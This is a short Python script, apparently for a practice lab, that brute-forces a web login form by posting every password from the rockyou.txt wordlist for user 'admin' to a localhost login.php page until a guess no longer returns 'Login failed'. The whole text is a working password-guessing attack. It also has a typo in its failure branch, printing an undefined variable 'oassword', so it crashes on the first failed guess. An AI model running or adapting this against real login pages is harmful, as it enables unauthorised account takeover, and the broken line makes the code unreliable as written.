import requests

url = "http://localhost/login.php"
username = "admin"

with open("/usr/share/wordlists/rockyou.txt","r",encoding="latin-1") as file:
	passwords = file.readlines()

for pwd in passwords:
	password = pwd.strip()
	data = {
		"username": username,
		"password": password,
		"Login": "Login"
	}

	response = requests.post(url, data=data)

	if "Login failed" not in response.text:
		print(f"\n Password Found: {password}")
		break
	else:
		print(f"[-] Tried: {oassword}")
